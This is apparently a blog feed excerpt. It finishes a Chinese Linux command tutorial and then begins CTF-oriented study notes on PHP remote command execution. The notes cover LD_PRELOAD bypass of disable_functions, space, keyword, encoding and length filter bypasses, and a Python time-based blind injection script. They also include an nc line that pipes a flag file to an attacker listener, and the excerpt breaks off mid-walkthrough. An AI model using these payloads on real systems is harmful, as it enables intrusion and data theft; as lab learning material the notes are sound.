src="/img/70.png"><br>1、图中以.开头的，表示linux系统的隐藏文件&#x2F;文件夹(只要以.开头，就能自动隐藏)<br>2、只有通过-a选项，才能看到这些隐藏文件&#x2F;文件夹<br>注意：选项可以组合使用，如-la、-al、-l -a都是一样的</p><h2 id="cd-切换工作目录"><a href="#cd-切换工作目录" class="headerlink" title="cd 切换工作目录"></a>cd 切换工作目录</h2><p>当Linux终端打开的时候，会默认以用户的HOME目录作为当前的工作目录<br>cd(change directory)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：cd[linux路径]</span><br><span class="line">cd无需选项，只有参数，表示要切换到哪个目录下</span><br><span class="line">cd命令直接执行，不写参数，表示回到用户的HOME目录</span><br></pre></td></tr></table></figure><h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><p>查看当前工作目录</p><h2 id="相对路径和绝对路径"><a href="#相对路径和绝对路径" class="headerlink" title="相对路径和绝对路径"></a>相对路径和绝对路径</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绝对路径：以根目录为起点，描述路径的一种写法，路径描述以/开头</span><br><span class="line">相对路径： 以当前目录为起点，描述路径的一种写法，路径描述无需以/开头</span><br></pre></td></tr></table></figure><p>特殊路径符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. 表示当前目录，比如cd./desktop表示切换到当前目录下的desktop目录内，和cd desktop效果一样</span><br><span class="line">..表示上一级目录，比如：cd ..退回上一级 cd ../.. 退回上两级 </span><br><span class="line">~ 表示HOME目录 cd ~ &lt;=&gt;cd</span><br></pre></td></tr></table></figure><p>eg:在当前目录的上级目录有一个test文件夹，文件夹内有一个文件hello.txt<br>相对路径为：..&#x2F;test&#x2F;hello.txt</p><h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><p>通过mkdir命令可以创建新的目录(文件夹)<br>mkdir(make directory)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语法：mkdir [-p] linux路径</span><br><span class="line">参数必填，表示创建文件夹的路径，相对路径和绝对路径均可</span><br><span class="line">-p选项可选，表示自动创建不存在的父目录，适用于创建连续多层级的目录</span><br></pre></td></tr></table></figure><p>eg:<code>mkdir -p itcast/good/666 </code>创建了三层级文件夹<br>注意：创建文件夹需要修改权限，请确保均在HOME目录内，不要在HOME目录外操作<br>涉及到权限问题，HOME外无法成功</p><h2 id="touch-创建文件"><a href="#touch-创建文件" class="headerlink" title="touch 创建文件"></a>touch 创建文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch linux路径</span><br><span class="line">参数表示创建的文件路径,记得写要创建的文件后缀</span><br></pre></td></tr></table></figure><h2 id="cat和more命令"><a href="#cat和more命令" class="headerlink" title="cat和more命令"></a>cat和more命令</h2><p>两者都是查看文件命令，但more支持翻页,使用空格翻页，使用q退出<br>语法：more&#x2F;cat linux路径</p><h2 id="cp复制文件-文件夹"><a href="#cp复制文件-文件夹" class="headerlink" title="cp复制文件&#x2F;文件夹"></a>cp复制文件&#x2F;文件夹</h2><p>cp命令来自英文copy</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语法：cp [-r] 参数1 参数2</span><br><span class="line">-r选项，可选，用于复制文件夹使用，表示递归</span><br><span class="line">参数1，linux路径，表示被复制的文件或文件夹</span><br><span class="line">参数2，linux路径，表示要复制去的地方</span><br></pre></td></tr></table></figure><h2 id="mv移动文件或文件夹"><a href="#mv移动文件或文件夹" class="headerlink" title="mv移动文件或文件夹"></a>mv移动文件或文件夹</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：mv 参数1 参数2</span><br><span class="line">1表示要移动的，2表示移动到的地方，如果目标不存在则进行改名，确保目标存在</span><br></pre></td></tr></table></figure><p>eg：mv test1.txt test2.txt 改名 </p><h2 id="rm删除文件、文件夹"><a href="#rm删除文件、文件夹" class="headerlink" title="rm删除文件、文件夹"></a>rm删除文件、文件夹</h2><p>rm(remove)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">语法：rm [-r -f] 参数1 参数2 ...</span><br><span class="line">-r适用于删除文件夹</span><br><span class="line">-f表示force，强制删除(不会弹出确认信息)</span><br><span class="line">参数表示要删除的文件或文件夹路径，用空格隔开</span><br></pre></td></tr></table></figure><h2 id="Vim编辑器"><a href="#Vim编辑器" class="headerlink" title="Vim编辑器"></a>Vim编辑器</h2><p>linux下常用的文本编辑器有Vim、gVim、gedit<br>在终端输入vim启动</p><p><strong>Vim有三种工作模式</strong></p><ul><li>普通模式：默认进入是普通模式，可以在冒号后面输入命令，如：wp，保存并退出</li><li>插入模式：在普通模式下，按i或者a进入，可以编辑文本内容</li><li>可视模式：在普通模式下按v进入，按ESC退出</li></ul><p><strong>保存与打开文件</strong><br>保存文件的命令是:w,打开文件的命令是:r<br>比如写入这样一段话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">good moring everyone !</span><br><span class="line">I am learning vim !</span><br></pre></td></tr></table></figure><p>编辑完按ESC退回普通模式，这时输入下面的命令，将文件保存到&#x2F;home&#x2F;linux&#x2F;文件夹下，命名为vim1.txt</p><blockquote><p>:w &#x2F;home&#x2F;linux&#x2F;vim1.txt</p></blockquote><p>Vim会显示下面的提示信息：<br>“~&#x2F;vim1.txt” [新] 3L ,48C已写入<br>表示新建了文件vim1.txt,文件有3行，48个字符<br>如果再次以同样的名字保存文件会提示：<br>E13：File exists (add ! to override)<br>这时我们可以在w后面加！来覆盖以前的文件：</p><blockquote><p>:w! &#x2F;home&#x2F;linux&#x2F;vim1.txt</p></blockquote><p>按ESC退回，输入:wq命令退出(:q!可以在不保存的情况下退出)<br>查看文件命令：</p><blockquote><p>:-r &#x2F;home&#x2F;linux&#x2F;vim1.txt</p></blockquote><p>也可以直接在终端输入：</p><blockquote><p>&#x2F;home&#x2F;linux&#x2F;vim1.txt</p></blockquote><p><strong>回退</strong><br>.(英文)：重复上一次修改<br>u：取消上一次修改<br>U：将当前行回复到修改前的状态<br>U命令会一次撤销对一行的全部操作，第二次使用U会撤销前一个U命令的操作，u或.同理<br>以上是Vim的一些基础操作</p><h2 id="关于shell"><a href="#关于shell" class="headerlink" title="关于shell"></a>关于shell</h2><p>shell有多种版本，我们常见到的版本是bash<br><strong>命令通配符</strong></p><blockquote><ul><li>：匹配任何字符和字符串，包括空字符串<br>?:匹配任意一个字符。比如？abc。可以匹配任何以abc结尾，以任意字符开头的4个字符<br>[]:匹配括号里的任意单字符。比如abc[def]，可以匹配以abc开头以def中任意一个字符结尾的字符串</li></ul></blockquote><p><strong>shell程序的基本结构</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">#hello</span><br><span class="line">echo &#x27;hello Linux&#x27;</span><br></pre></td></tr></table></figure><p>1、所有的shell程序第一行都是以#！开头，后面跟执行shell程序的shell解释器目录与名称。系统默认的shell解释器是bash<br>2、程序的第二行以注释的形式写出程序的名称<br>3、只有添加了可执行权限后才可以执行<br>chmod +x 文件名<br>如果将文件保存在用户主目录下，只需要在终端输入.&#x2F;文件名,就可以运行<br>运行结果： hello Linux</p><p><strong>变量</strong><br>在shell程序中的变量分为局部变量、环境变量、位置变量</p><p><strong>局部变量</strong><br>Shell语言是解释型语言，不用事先声明变量，一对变量赋值就等于定义了变量。局部变量是指只在当前程序中有效<br>shell变量是无类型的，可以存放不同类型的数据，访问变量只需要在变量前面加$<br>ps：对没有空格的字符串赋值可以不用引号，但如果有空格也没加引号就会报错</p><p><strong>环境变量</strong><br>环境变量是在一个用户的所有进程中都可以访问的变量。在系统中常常使用环境变量来存储常用的信息</p><p><strong>位置变量</strong><br>位置变量是指shell程序在运行时传入的参数，在程序中可以以变量的形式来调用。这些参数被存放在1~9个变量名中，与普通变量一样在变量前加$来访问。<br><img src="/./img/161.png"><br>在位置变量中，$0的值为bash；$1开是输入参数<br>比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#! /bin/bash</span><br><span class="line">#3.sh</span><br><span class="line">echo $1;</span><br><span class="line">echo $2;</span><br></pre></td></tr></table></figure><p>那么在保存和添加执行权限后在终端输入</p><blockquote><p>.&#x2F;3.sh hello linux </p></blockquote><p>运行结果是：<br>hello<br>linux</p><p><strong>反引号</strong><br>反引号用于执行引号中的系统命令，然后将命令的执行结果返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A=`ls`</span><br><span class="line">结果：01.c 02.c 1.sh 2.sh</span><br></pre></td></tr></table></figure><p>字符串中不能直接使用$、单引号、双引号、反斜线、反引号等特殊字符，需要\转义</p><p><strong>多命令执行</strong></p><blockquote><p>; 顺次执行命令<br>| 前一个命令执行结果的标准输出传递给后面进行执行，即作为后面命令的标准输入<br>|| 如果1执行成功则不执行2；如果1失败则执行2<br>&amp;&amp; 1成功则继续执行2；1不成功则不执行2</p></blockquote><p>这也就解释了为什么grep前面要加|</p><h2 id="Linux文件系统"><a href="#Linux文件系统" class="headerlink" title="Linux文件系统"></a>Linux文件系统</h2><p><strong>Linux文件系统的组织方式</strong><br>Linux文件系统的组织方式称为文件系统分层标准(FHS),即采用层次式的树状目录结构<br><img src="/./img/162.png"></p><table><thead><tr><th>目录名称</th><th>说明</th></tr></thead><tbody><tr><td>&#x2F;</td><td>Linux文件系统的最上层根目录，其他所有目录均是该目录的子目录</td></tr><tr><td>&#x2F;bin</td><td>Binary的缩写，存放用户的可执行程序，如cp和mv等:也存放Shell,如bash和csh</td></tr><tr><td>&#x2F;boot</td><td>操作系统启动时所需的文件，包括vmlinuz和initrd.img等。若这些文件损坏，则会导致系统无法正常启动，因此最好不要任意改动</td></tr><tr><td>&#x2F;dev</td><td>设备文件目录，例如&#x2F;dev&#x2F;sda 表示第一块sCsI设备，&#x2F;dev&#x2F;hda 表示第一块IDE设备</td></tr><tr><td>&#x2F;etc</td><td>有关系统设置与管理的文件，包括密码、守护程序及与X-Window 相关的配置。可以通过编辑器(如Vi、gedit 等)打开并编辑相关的配置文件</td></tr><tr><td>&#x2F;etc&#x2F;X11</td><td>X-Window System的配置目录</td></tr><tr><td>&#x2F;home</td><td>普通用户的主目录或FTP站点目录，一般存放在&#x2F;home 目录下</td></tr><tr><td>&#x2F;lib</td><td>存放共享函数库(Library)</td></tr><tr><td>&#x2F;mnt</td><td>文件系统挂载点(Mount),例如光盘的挂载点可以是&#x2F;mnt&#x2F;cdrom,软盘的挂载点可以是&#x2F;mnt&#x2F;floppy,Zip驱动器为&#x2F;mnt&#x2F;zip</td></tr><tr><td>&#x2F;opt</td><td>该目录通常提供给较大型的第三方应用程序使用，如Sun Sarfice. Corel WordPerfect,可避免将文件分散至整个文件系统</td></tr><tr><td>&#x2F;proc</td><td>保存目前系统内核与程序执行的相关信息，和利用ps命令看到的内容相同。例如，&#x2F;proc&#x2F;interruptsp文件保存了当前分配的中断请求端口号，&#x2F;proc&#x2F;cpuinfo保存了当前处理器信息</td></tr><tr><td>&#x2F;root</td><td>根用户的主目录</td></tr><tr><td>&#x2F;sbin</td><td>System Binary的缩写。此目录存放的是系统启动时所需执行的系统程序</td></tr><tr><td>&#x2F;tmp</td><td>Temporary的缩写，用来存放临时文件的目录</td></tr><tr><td>usr</td><td>存放用户使用的系统命令和应用程序</td></tr><tr><td>&#x2F;usr&#x2F;bin</td><td>存放用户可执行的程序，如Openffice的可执行程序</td></tr><tr><td>&#x2F;usr&#x2F;doc</td><td>存放各种文档的目录</td></tr><tr><td>&#x2F;usr&#x2F;include</td><td>存放C语言用到的头文件</td></tr><tr><td>&#x2F;usr&#x2F;include&#x2F;X11</td><td>存放x-Window程序使用的头文件</td></tr><tr><td>&#x2F;usr&#x2F;info</td><td>存放GNU文档的目录</td></tr></tbody></table><p><strong>Linux文件和目录常用通配符</strong></p><table><thead><tr><th>通配符</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>用来代表文件中任意长度的任意字符</td></tr><tr><td>?</td><td>用来代表文件中的任意一个字符</td></tr><tr><td>[…]</td><td>匹配任意一个在中括号中的字符,中括号中可以是个用破折号格式表示的字母或数字范围</td></tr><tr><td>前导字符串{…}后继字符串</td><td>大括号中的字符串逐一匹配前导字符串和后继字符串</td></tr></tbody></table><p>[]{}中的字符用,隔开<br>着重介绍一下{}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#ls -l c&#123;ar,an,at&#125;s</span><br><span class="line">列出car、cans、cats</span><br></pre></td></tr></table></figure><h2 id="文件内容查询命令——grep"><a href="#文件内容查询命令——grep" class="headerlink" title="文件内容查询命令——grep"></a>文件内容查询命令——grep</h2><p>该命令在文件中搜索指定的字符串模式，列出含有匹配模式字符串的文件名和输出含有该字符串的文本行<br>命令格式：</p><blockquote><p>grep [选项] [查找模式] [文件名]<br>-F：将查找模式看作单纯的字符串<br>-i：要查找的字符串不区分字母的大小写<br>-r：以递归方式查询目录下的所有子目录的文件<br>-n：标出包含指定字符串的行编号</p></blockquote><p>另外：grep可以直接处理一些命令(如ls、ps)的输出，比如在当前运行的进程中查找vi程序的进程信息：</p><blockquote><p>#ps aux | grep vi</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/RCE.html"/>
      <url>/RCE.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>利用RCE漏洞，有两种执行方式，向后台服务器远程注入操作系统命令（即远程命令执行RemoteCommand Exec）或者远程代码执行（Remote Code Exec），顾名思义就是远程执行，通过上述的远程注入后，从而执行系统命令，进而控制后台系统。</p><h2 id="可能存在代码执行漏洞的函数"><a href="#可能存在代码执行漏洞的函数" class="headerlink" title="可能存在代码执行漏洞的函数"></a>可能存在代码执行漏洞的函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eval() 把字符串当作 PHP 代码来执行，必须以分号结尾</span><br><span class="line">assert()断言函数 在RCE漏洞里的作用和eval相当且不需要加分号</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>1.开发人员调用了能够执行系统命令的函数<br>2.这个函数的参数可控（即用户能够控制）<br>3.开发人员没有对该函数的参数进行过滤或过滤不严</p><h3 id="执行系统命令的函数"><a href="#执行系统命令的函数" class="headerlink" title="执行系统命令的函数"></a>执行系统命令的函数</h3><blockquote><p>system()、passthru()、exec()、shell_exec()、popen()、proc_open()、pcntl_exec()、反引号</p></blockquote><p>需要关注的点：函数有没有回显、需要什么参数<br><strong>1、system()</strong><br>提交命令-&gt;回显<br><strong>2、exec()</strong><br>exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )；<br>如果只提供command参数只会返回最后一行，添加output参数（使用一个变量接收），内容就会填充此数组，后使用print_r或var_dump函数输出变量<br>windows环境使用dir参看当前目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd = &#x27;dir&#x27;;</span><br><span class="line">exec($cmd,$dazhuang);</span><br><span class="line">var_dump($dazhuang);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/209.png"><br>ps：exec函数需要使用输出函数输出<br><strong>3、passthru()</strong><br>passthru(string $command…)<br>可以直接回显，输入指令即可,和system相似<br><strong>4、shell_exec()</strong><br>shell_exec(string $cmd),cmd:要执行的命令<br>使用echo、print输出结果，返回结果是字符串的形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo shell_exec(&#x27;dir&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/img/210.png"><br>效果和反引号一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=&#x27;dir&#x27;;</span><br><span class="line">echo `$cmd`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>5、popen()</strong><br>popen(string $command,string $mode)<br>mode:模式，’r’表示阅读，’w’表示写入<br>在r模式下，先fgets获取内容，然后print_r输出内容<br>相当于把命令执行的结果当作一个临时文档（进程），要选择写入或者读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$s = popen(&#x27;dir&#x27;,&#x27;r&#x27;);</span><br><span class="line">$b =fgets($s);</span><br><span class="line">print_r($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>6、proc_open()比较麻烦，默认没有回显</p><p><strong>7、pcntl_exec()</strong></p><p>pcntl_ exec(string $path, array $args&#x3D; ?, array $envs&#x3D; ?)</p><p>path:必须是可执行二进制文件路径，args：是一个要传递给程序的参数字符串数组</p><h3 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h3><p>使用场景：disable_ _functions禁用所有可能用到命令执行的函数</p><p>动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接</p><p><code>LD_PRELOAD</code>可以修改库文件，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p><p><code>mail</code>(常用）：内嵌在php中，<code>imagick</code>：需要扩展安装</p><p><img src="/img/image-20231004152802121.png" alt="image-20231004152802121"></p><p><img src="/img/image-20231004153347989.png" alt="image-20231004153347989"></p><p>mail函数在调用sendmail后会再调用动态链接库，而LD_PRELOAD规定优先调用的动态链接库，putenv函数可以修改LD_PRELOAD</p><p><img src="/img/image-20231004153844400.png" alt="image-20231004153844400"></p><p>所以我们需要上传的是demo.so(geteuid函数重定义)和demo.php</p><p><img src="/img/image-20231004155324153.png" alt="image-20231004155324153"></p><p><img src="/img/image-20231004155404504.png" alt="image-20231004155404504"></p><p>反弹shell不太懂，先等等</p><p>但是使用蚁剑自带的插件就能绕过disable_functions</p><p><img src="/img/image-20231004162921283.png" alt="image-20231004162921283"></p><p><img src="/img/image-20231004165232234.png" alt="image-20231004165232234"></p><h3 id="linux连接符"><a href="#linux连接符" class="headerlink" title="linux连接符"></a>linux连接符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 把前面命令的输出结果当成后面命令的参数，只显示后面命令执行结果</span><br><span class="line">|| 如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp; 前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp; 如果前面为假，后面的命令也不执行，如果前面为真则执行后面的命令</span><br><span class="line">; 顺序执行，前面指令出错不影响后面的指令执行      </span><br></pre></td></tr></table></figure><p><code>/bin/bash -c ls</code>和<code>echo &quot;ls&quot; | /bin/bash</code>效果一样</p><p><code>/bin/bash</code>：这部分指定了要使用的 shell，指定了要使用 Bash shell。<code>-c</code>：用于告诉 Bash shell 后面的参数是要执行的命令,linux中的shell：bash、sh、dash等等</p><h3 id="linux绕过"><a href="#linux绕过" class="headerlink" title="linux绕过"></a>linux绕过</h3><p>？ *替代一些被过滤的关键字，让系统自动匹配</p><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><ul><li><p>{cat,&#x2F;flag}</p></li><li><p>$IFS   &#x2F;&#x2F;$IFS在linux下表示内部字段分隔符</p></li><li><p>${IFS}</p></li><li><p>$IFS$9</p></li><li><p>&lt;</p></li><li><p>&lt;&gt;</p></li><li><p>%20 (space)</p></li><li><p>%0a(换行)</p></li><li><p>%09 (tab)</p></li><li><p>linux命令中可以加\，所以甚至可以ca\t &#x2F;fl\ag</p></li></ul><h3 id="读取文件绕过"><a href="#读取文件绕过" class="headerlink" title="读取文件绕过"></a>读取文件绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tac:反向显示  </span><br><span class="line">less/more:一页一页显示文件内容，敲空格显示下一页</span><br><span class="line">tail:查看末尾几行，默认最后10行</span><br><span class="line">nl：显示的时候，顺便标注行号</span><br><span class="line">od：以二进制的方式读取文件内容 //显示是以16进制</span><br><span class="line">xxd:读取二进制文件</span><br><span class="line">sort：主要用于排序文件</span><br><span class="line">uniq:报告或删除文件中重复的行</span><br><span class="line">file -f：报错出具体内容</span><br><span class="line">grep:在文本中查找某些字符串</span><br><span class="line">rev:反转文件中的每一行</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231004172311642.png" alt="image-20231004172311642"></p><p><code>od -A  d -c  flag.php</code>  </p><p><img src="/img/image-20231004172346355.png" alt="image-20231004172346355"></p><p><code>xxd test.php</code></p><p><img src="/img/image-20231004172724167.png" alt="image-20231004172724167"></p><p><code>/usr/bin/sort test.php</code> 等效于 <code>sort test.php</code>，也可以<code>/usr/bin/s?rt test.php</code>,使用?自动匹配，可以在sort被过滤的时候尝试 。&#x2F;usr&#x2F;bin:存放用户可执行的程序</p><p><img src="/img/image-20231004174514182.png" alt="image-20231004174514182"></p><p><code>file -f  test.php</code></p><p><img src="/img/image-20231004174931318.png" alt="image-20231004174931318"></p><p><code>grep fl test.php</code></p><p><img src="/img/image-20231004175411925.png" alt="image-20231004175411925"></p><p><img src="/img/image-20231004175606270.png" alt="image-20231004175606270"></p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>绕过原理：命令编码后上传到服务器，绕过过滤限制，服务器解码读取命令并执行</p><p>绕过方法：base64、32、HEX编码（ascii）、shellcode(16进制的机器码)</p><p>&#x2F;bin&#x2F;bash、bash、sh、反引号、$()都可以实现</p><p><code>echo Y2F0IHRlc3QucGhw | base64 -d | /bin/bash </code></p><p><code>$(echo Y2F0IHRlc3QucGhw | base64 -d)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo Y2F0IHRlc3QucGhw | base64 -d`</span><br></pre></td></tr></table></figure><p><img src="/img/image-20231004181151061.png" alt="image-20231004181151061"></p><p><code>echo &quot;74616320746573742e706870&quot; | xxd -r -p | bash</code></p><p>xxd -r -p将16进制反向输出打印为ascii格式</p><p><img src="/img/image-20231004182710990.png" alt="image-20231004182710990"></p><p>但是xxd是个工具，不是所有的服务器都装有，这种情况下可以使用shellcode编码绕过</p><p><code>printf &quot;\x63\x61\x74\x20\x74\x65\x73\x74\x2e\x70\x68\x70&quot; | bash</code>也可以试一下echo，可能在目标服务器无法执行，shellcode编码可以被服务器识别<br>在遇到post中空格被过滤可以使用\x09，换行\x0a(攻防世界 unseping)</p><h3 id="无回显时间盲注"><a href="#无回显时间盲注" class="headerlink" title="无回显时间盲注"></a>无回显时间盲注</h3><p>页面无法shel反弹或者无法回显，或者没有写入权限，可尝试命令盲注，根据返回的时间来进行判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if [ $(cat ./test.php | awk NR==1 | cut -c 1) == h  ];then sleep 2;fi</span><br></pre></td></tr></table></figure><p>awk NR&#x3D;&#x3D;1获取第一行，cut -c 获取单个字符，if为真则执行then，否则执行fi结束。特殊字符要\转义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line">url = <span class="string">&quot;http://192.168.1.6:18000/class08/1.php&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">55</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            k = <span class="built_in">chr</span>(k)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            payload = <span class="string">&quot;?cmd=&quot;</span> + <span class="string">f&quot;if [ `ls | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == <span class="subst">&#123;k&#125;</span> ];then sleep 2;fi&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                requests.get(url=url+payload,timeout=(<span class="number">1.5</span>,<span class="number">1.5</span>))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                result = result + k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="长度过滤绕过"><a href="#长度过滤绕过" class="headerlink" title="长度过滤绕过"></a>长度过滤绕过</h3><p><code>&gt;</code>创建文件并写入或者<code>覆盖</code>文件原本的内容 ,<code>&gt;b</code>直接创建文件<br><code>&gt;&gt;</code>追加内容<br>在没有写完的命令后面加<code>\</code>,可以将一条命令写在多行<br><img src="/img/image-20231005152101653.png" alt="image-20231005152101653"></p><p><code>ls -t</code>按修改时间排序，最新优先 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;ag</span><br><span class="line">&gt;l \\</span><br><span class="line">&gt;f \\</span><br><span class="line">&gt;cat\ \\</span><br><span class="line">ls -t &gt;x</span><br><span class="line">.x(sh x)  //执行了cat flag</span><br></pre></td></tr></table></figure><p><code>\\</code>把后面的\转义成普通字符<br><code>dir</code>:按列输出，不换行；d字符靠前<br><code>*</code>相当于$(dir *):将第一个文件名作为命令，把后续的文件名作为参数，输出执行结果。ls会换行，不行</p><h3 id="长度过滤为7绕过"><a href="#长度过滤为7绕过" class="headerlink" title="长度过滤为7绕过"></a>长度过滤为7绕过</h3><p><img src="/img/image-20231006190337511.png" alt="image-20231006190337511"></p><p>exec函数需要输出函数，这里没有，采用nc反弹，<code>cat flag|nc 192.168.1.161:7777</code>（cat展示内容，通过nc反弹，提交到192.168.1.161，注意管道输出符）,然后kali上输入指令<code>nc -lvp 7777</code>来监听端口</p><p><strong>利用过程</strong></p><p>步骤一：倒序写入，创建文件</p><p><img src="/img/image-20231006191837124.png" alt="image-20231006191837124"></p><p><code>\</code>将空格实体化成字符，注意空格构造，不能输入重复指令，因为文件名不能重复，所以这里采用单独构造空格，<code>c\ \\</code>,<code>t\ \\</code>这样灵活构造，但是在长度过滤为5中空格只能单独构造<br>步骤二： 